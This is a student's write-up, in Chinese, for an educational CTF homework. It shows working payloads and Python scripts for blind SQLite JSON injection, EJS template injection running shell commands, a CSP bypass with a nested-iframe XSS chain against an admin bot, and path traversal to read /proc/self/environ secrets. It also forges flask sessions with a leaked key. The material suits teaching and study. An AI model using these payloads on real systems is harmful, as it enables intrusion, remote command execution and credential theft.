# EDU-CTF HW4 Writeup

學號：`109550157`

## Double Injection - FLAG1

Flag：`FLAG{sqlite_js0n_inject!on}`

在 source code 中，我們可以注意到 `username` 是我們可以 inject 的地方。

![image](https://hackmd.io/_uploads/B1su6IuDa.png)

為了知道 inject 的狀況，我在本機把 server 跑了起來。

一個簡單的 injection 如下：

```
") AS _, 'true' AS password FROM db --
```

若將上面作為 username 輸入，那麼只需使用 `true` 做為密碼即可登入。

以下是我開啟 server 的 `console.log()` 後的顯示結果：

```shell=
hw-doubleinjection-app-1  | query:  SELECT json_extract(users, "$.\") AS _, 'true' AS password FROM db --.password") AS password FROM db
hw-doubleinjection-app-1  | row:  { _: null, password: 'true' }
```

用二個 column 是為了把第一個 column 中的奇妙雙引號給處理掉。

注意到我們可以利用 `WHERE` 和 `UNION` 來構造一個指令，使得我們的條件一旦成立，就使用特定的密碼 A，不成立則使用密碼 B。

很顯然的，為了 leak 出 `$.admin.password` 的內容，我使用了 `unicode` 和 `substr` 函式來取得特定字元的 ASCII 碼，並且條件式簡單判斷該 ASCII 碼是否 < 特定值。

若符合條件，則密碼為 `true`，否則為 `false`。

構造如下：

```
") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), index )) < value UNION SELECT 'pad' AS _, 'false' AS password FROM db  --
```

我撰寫了以下程式碼，可以做為簡易的登入用工具：

```python=
# url = "http://localhost:3000/"
url = "http://10.113.184.121:10081/"

login_url = f"{url}login"


def login(username, password):
    data = {"username": username, "password": password}
    r = requests.post(login_url, data=data)
    return r.text
```

若登入成功，則 `r.text = "<h1>Success!</h1>"`；
若登入失敗，則 `r.text = "Unauthorized"`。

那麼利用以下函式去二分搜每個位置的 ASCII 碼，就能 leak 出 admin 的密碼：

```python=
def find_password():
    password = ""
    for i in range(1, 64):
        lo = 0
        hi = 128
        while lo < hi:
            mid = (lo + hi) // 2
            username = f"\") AS _, 'true' AS password FROM db WHERE unicode(substr( json_extract(users, '$.admin.password'), {i} )) < {mid} UNION SELECT 'pad' AS _, 'false' AS password FROM db  --"
            result = login(username, "true")
            if "Success" in result:
                hi = mid
            else:
                lo = mid + 1
        if lo == 128:
            break
        password += chr(lo - 1)
    return password
```

以下為取得 flag 的畫面：

![image](https://hackmd.io/_uploads/B15NpUuP6.png)

## Double Injection - FLAG2

Flag：`FLAG{ezzzzz_sqli2ssti}`

注意到如果使用 `FLAG1` 做為密碼，頁面就會把 `username` inject 進 template 進行 render。

這題相對簡單很多，只需要了解 `ejs` 怎麼做 template injection。

只需在 `username` 中，放入以下字串，就能將 `command` 的執行結果顯示在頁面上。

```javascript!
<%= global.process.mainModule.require('child_process').execSync('{command}').toString() %>
```

我做了以下函式來簡單的將 `command` 和 `password` inject 其中。

```python=
password = "FLAG{sqlite_js0n_inject!on}"

def run_command(command):
    username = f"\") AS _, '{password}' AS password FROM db -- <%= global.process.mainModule.require('child_process').execSync('{command}').toString() %>"
    return login(username, password)
```

執行 `ls /`：

```python=
print(run_command("ls /"))
```

![image](https://hackmd.io/_uploads/HkeXdDOwp.png)

flag 名稱叫做 `/flag2-1PRmDsTXoo3uPCdq.txt`。

```python=
print(run_command("cat /flag2-1PRmDsTXoo3uPCdq.txt"))
```

以下為取得 flag 的畫面：

![image](https://hackmd.io/_uploads/r1e1yuwODp.png)

## Note - FLAG1

Flag：`FLAG{byp4ss1ing_csp_and_xsssssssss}`

從 `app.py` 中可以得知 CSP 的限制，有白名單可以利用：

```python!
response.headers['Content-Security-Policy'] = "default-src 'self'; style-src 'unsafe-inline'; script-src 'self' https://unpkg.com/"
```

從 `note.js` 可以得知筆記內容是以 `marked.parse(result.content)` 後，寫入 `div` 的 innerHTML；這樣的寫法並不能讓被寫入的 `<script>` 被執行：

```javascript=
note.innerHTML = `
<h1>${result.title}</h1>
<p>${marked.parse(result.content)}</p>
<hr/>
<span style="color: #999">
    By @${result.author}・🔒 Private・
    <form action="/report" style="display: inline" method="post">
        <input type="hidden" name="note_id" value="${noteId}">
        <input type="hidden" name="author" value="${result.author}">
        <input type="submit" value="Report">
    </form>
</span>
`;
```

但使用 `<iframe>` 的 `srcdoc` 可以生成 HTML tag，若用它生出 `<script>` tag，是會被執行的；配合 `https://unpkg.com` 上的 `csp-bypass` package，我們可以針對每個 script，去做出以下 note content：

```python=
def script_to_html(script):
    return f"<iframe srcdoc=\"<br csp='{script}'><script src='https://unpkg.com/csp-bypass/dist/sval-classic.js'></script>\"></iframe>"
```

舉例來說，建立一個有以下內容的 note，便能在瀏覽器上看到 `alert` 的結果：

```htmlembedded=
<iframe srcdoc="<br csp='alert(8888)'><script src='https://unpkg.com/csp-bypass/dist/sval-classic.js'></script>"></iframe>
```

![image](https://hackmd.io/_uploads/H1-WUJhva.png)

有了 `XSS` 的能力，再來便是想辦法利用 `bot` 來 leak 出我們想要的資訊。

有以下幾個要關注的點：

1. 哪些頁面有我們想要的資訊？
    - `FLAG1 By @admin`
2. 我們是否有足夠的權限到那個頁面？如果沒有，那誰有？
    - 從 `bot.py` 中可以看出，它會用 `admin` 的帳號密碼登入後，再到被 report 的頁面上。
3. 承上題，別人看得到，但我們怎麼看到？
    - `CSP` 擋的很嚴格，幾乎只能從 `self` 收發資料；可以觀察看看 `app.py` 中的 `POST` 部分，因為這是 `bot` 能合法發 request 的地方。

整個 `app.py` 只有 3 個可以 `POST` 的地方，如下：

1. `@app.post("/login") => action_login()`
    - 注意到就算你現在是登入狀態，你還是能對這裡發一個新的 request。
2. `@app.post("/api/notes") => api_create_note()`
    - 可惜的是，`admin` 不能 create note。
3. `@app.post("/report") => report()`
    - `report` 只會觸發 `bot`，沒有資料保留的用途。

注意到我們其實可以將 `bot` 看到的內容，當成 `username` 用密碼 A 去註冊一隻帳號。

當 `bot` 成功註冊完帳號後，我們可以暴搜 `username` ，並使用不同於密碼 A 的密碼 B 去登入。此時可能會遇到 `3` 種狀況：

1. `Successfully registered!`
    - 代表說這隻帳號第一次被註冊，它的密碼會是 B，這不是被 `bot` 註冊的帳號。
2. `Invalid username or password!`
    - 這隻帳號已被註冊，且用密碼 B 登不進去，也就是已經被 `bot` 註冊的帳號。
3. 進到 `index.html`
    - 這隻帳號已被註冊，且用密碼 B 登的進去，代表曾經發生過 `1.` 的狀況。

假設我們要 leak 的內容長度是 $L \approx 32$，內容字元集為 $S \approx 100$，直接暴力枚舉所有可能的時間複雜度是 $\mathcal O{(|S|^L \cdot \text{complexity of login})}$，顯然爆炸。

一次只註冊一個字元，那只需要 $\mathcal O{(L \cdot |S| \cdot \text{complexity of login})}$ 的複雜度就可以得到內容。

可以寫出像是下面的 code 來做登入的檢查：

```python=
import string
import requests

URL = "http://10.113.184.121:10082/"
NONCE = "4_R@ND0M_Str1ng!"  # at most 15
PASSWORD_B = "BBBBB"
L = 32
S = string.printable


def login(username, password):
    r = requests.post(URL + "login", data={"username": username, "password": password})
    return "Invalid username or password!" in r.text


flag = ""
for i in range(L):
    for s in S:
        if login(f"{i}_{NONCE}_{ord(s)}", PASSWORD_B):
            flag += s
            break
    else:
        break

print(flag)

```

`NONCE` 的用途是為了避免跟其他解題者相撞。

現在問題來了，怎麼讓 `bot` 註冊符合我們形式的帳號呢？

注意到 `<iframe>`  裡面可以繼續嵌套 `<iframe>`，這使得我們可以邊開著想要 leak 資訊的頁面，邊執行想執行的 script。

受限於長度和 `<iframe>` 的延遲載入，我們所需要的 script 可能沒辦法被放在同一個 note 中；再者，我們也需要用 `<iframe>` 開著 `'/'` 和 `'/login'` 頁面，來讓我們註冊帳號、偷取頁面資訊。

我的 `<iframe>` 構造如下：

- ROOT `<iframe name="a">`
  - `<iframe name='b' src='/'>`
  - `<iframe name='c' src='/login'>`
  - NOTE 0 `<iframe>`
    - script 1 `<br csp='...'>`
    - NOTE 1 `<iframe>`
      - script 2 `<br csp='...'>`
      - NOTE 2 `<iframe>`
        - script 3 `<br csp='...'>`
        - ... keep going if you want

注意到我有幫 `<iframe>` 取名，以便我用 `top.a.b` 來取得 `'/'` 的 window、`top.a.c`  來取得 `'/login'` 的 window。

從撰寫腳本的角度來看，我必須先把所有 `script` 建完，再按照 NOTE 2, NOTE 1, NOTE 0, ROOT 的順序去 create note，實作上我會需要 create 完的 note_id：

```python=
import json

SESSION = requests.Session()  # Already login


def create_note(title, content):
    r = SESSION.post(URL + "api/notes", json={"title": title, "content": content})
    return json.loads(r.text)["id"]
```

我需要以下 4 條 script，注意到我也順便考慮好延時的部分：

```javascript=
setTimeout(()=>top.a.b.noteList.children[0].click(),0);
setTimeout(()=>top.a.c["login-form"].username.value=`{{ i }}_{{ NONCE }}_${top.a.b.note.children[2].textContent.charCodeAt( {{ i }} )}`,1000);
setTimeout(()=>top.a.c["login-form"].password.value= {{ PASSWORD_A }} ,1000);
setTimeout(()=>top.a.c["login-form"].submit(),2000)
```

它們分別做了以下事情：

1. 點下 `admin` 介面唯一的 `note` (`<div>`)。
    - ![image](https://hackmd.io/_uploads/rkgSwx2Dp.png)

2. 把已經跳轉到 `FLAG1` 頁面的 `flag1[i]` 的 ascii 碼跟其他資訊組成 `username`，塞到 `/login` 頁面的 `login-form.username` 中。
    - ![image](https://hackmd.io/_uploads/SyT-dghP6.png)

3. 把密碼 A 塞到 `/login` 頁面的 `login-form.password` 中。
4. submit `/login` 頁面的 `login-form`。

最後再去戳 report 頁面，讓 `bot` 到 ROOT 頁面即可。

```python=
def report(note_id, author):
    r = SESSION.post(URL + "report", data={"note_id": note_id, "author": author})
    return r
```

實作部分，具體程式碼如下：

```python=
def register_index_nonce_ascii_at(index):
    g1_id = create_note(
        f"{NONCE}_{index}_g1",
        script_to_html(f"setTimeout(()=>top.a.b.noteList.children[0].click(),0)"),
    )

    g2_id = create_note(
        f"{NONCE}_{index}_g2",
        script_to_html(
            "setTimeout(()=>top.a.c[&quot;login-form&quot;].username.value=`"
            + index_to_username(index)
            + "`,1000)"
        ),
    )

    g3_id = create_note(
        f"{NONCE}_{index}_g3",
        script_to_html(
            "setTimeout(()=>top.a.c[&quot;login-form&quot;].password.value=`"
            + index_to_username(index)
            + "`,1000)"
        ),
    )

    g4_id = create_note(
        f"{NONCE}_{index}_g4",
        script_to_html("setTimeout(()=>top.a.c[&quot;login-form&quot;].submit(),2000)"),
    )

    note2_id = create_note(
        f"{NONCE}_{index}_note2",
        '<iframe srcdoc="'
        + note_id_to_iframe(g3_id)
        + note_id_to_iframe(g4_id)
        + '"></iframe>',
    )

    note_1_id = create_note(
        f"{NONCE}_{index}_note1",
        '<iframe srcdoc="'
        + note_id_to_iframe(note2_id)
        + note_id_to_iframe(g2_id)
        + '"></iframe>',
    )

    note0_id = create_note(
        f"{NONCE}_{index}_note0",
        '<iframe srcdoc="'
        + note_id_to_iframe(note_1_id)
        + note_id_to_iframe(g1_id)
        + '"></iframe>',
    )

    root_id = create_note(
        f"{NONCE}_{index}_root",
        "<iframe name=\"a\" srcdoc=\"<iframe name='b' src='/'></iframe><iframe name='c' src='/login'></iframe>"
        + note_id_to_iframe(note0_id)
        + '"></iframe>',
    )

    report(root_id, USERNAME)
    return root_id
```

我做了一個函式幫我構造某一輪的 `username`：

```python=
def index_to_username(index):
    return (
        f"{index}_{NONCE}_"
        + "${top.a.b.note.children[2].textContent.charCodeAt("
        + f"{index}"
        + ")}"
    )
```

還有根據 `note_id` 來作出該 NOTE 的 `<iframe>`；注意到必須要加上 `author` args，不然 `admin` 看不到這個 note：

```python=
def note_id_to_iframe(note_id):
    return f"<iframe src='/note?id={note_id}&author={USERNAME}'></iframe>"
```

只要先註冊完帳號，剩下就是暴力登入嘗試了。

網路太差，以下就放我取得一半 flag 的畫面：

![image](https://hackmd.io/_uploads/BJDhjxhvp.png)

## Note - FLAG2

Flag：`FLAG{n0t_just_4n_xss}`

注意到這題在知道檔名的情況下是可以任意讀檔的，作法是注意到 `os.path.join` 在第二個參數傳傳入的字串開頭為 '/' 時，會直接捨棄第一個參數的字串：

```python=
@app.get("/api/notes")
@login_required
def api_get_note_content():
    note_id = request.args.get("id")
    
    # ...

    with open(os.path.join(user_dir, note_id)) as f:
        content = f.read().strip()

    # ...
    
    return {"author": note_author, "title": title, "content": content}
```

比如說造訪 `/note?id=/app/Dockerfile`， bot 就會看到像是以下的頁面：

![image](https://hackmd.io/_uploads/B1dWb-hP6.png)

這題瞬間變成世紀大梗題，把上一個 stage 的 `/` 改成 `/app/Dockerfile`，然後拔掉點擊 `div` 的 code，跟喬一下填進 `username` 的資訊即可。

我就秀個 diff 就好：

![image](https://hackmd.io/_uploads/HJCS-bnva.png)

![image](https://hackmd.io/_uploads/SyiUbb2Pp.png)

![image](https://hackmd.io/_uploads/Sygu-b3Da.png)

以下為取得 flag 的畫面：

![image](https://hackmd.io/_uploads/HJ7n--3wp.png)

## Note - Advanced

這題其實預期是希望 leak 出 flask 的 `SECRET_KEY` 後，便可以構造任意的 flask session，而達到竄改 `username` 的內容。

具體 leak flask `SECRET_KEY` 的方式可以到 `/proc/self/environ`，因為 container 構建時會去讀的就是環境變數內的 `SECRET_KEY`：

![image](https://hackmd.io/_uploads/SkdBGb2wa.png)

或者也能順便拿個 `ADMIN_PASSWORD` 後再進來直接用看的：

![image](https://hackmd.io/_uploads/BkaqzWhv6.png)

構造 `username` 的方式如下：

```shell
flask-unsign --sign --cookie "{'username': '/'}" --secret "IwZOzaGCkoNO84ekMyrOAC27MP6JniZsGezwpRcsEhU"
```

注意到大多數 `app.py` 裡面的 API 都是 `@login_required`，且多數都是使用 `session["username"]` 在尋找 NOTE 的資料夾。

可以用一樣的 `os.path.join` 的洞，直接把想看的資料夾當成 `username` 放進去。

可惜的是，這個做法有一個限制：要看的資料夾底下只能全是檔案，若有資料夾，則會在 Line 9 的地方出錯。

```python=
@app.get("/api/notes/all")
@login_required
def api_notes():
    notes = []
    user_dir = os.path.join(NOTES_DIR, session["username"])
    for filename in os.listdir(user_dir):
        # if not os.path.isfile(os.path.join(user_dir, filename)):
        #     continue
        with open(os.path.join(user_dir, filename)) as f:
            notes.append({
                "id": filename,
                "author": f.readline().strip(),
                "title": f.readline().strip()
            })
    return jsonify(notes)
```

以 `'/'` 作為 `username` 的結果：

![image](https://hackmd.io/_uploads/Hy7kr-nwp.png)

以 `'/home/ctf'` 作為 `username` 的結果：

![image](https://hackmd.io/_uploads/Skh-r-hDp.png)

最後附上一個用 admin 直接看 `/app/Dockerfile` 的結果：

![image](https://hackmd.io/_uploads/H1qYMknP6.png)

## Private Browsing: Revenge

Flag：`FLAG{omg_y0u_hack3d_th3_c4t_sh0p!}`

以下為取得 flag 的畫面：
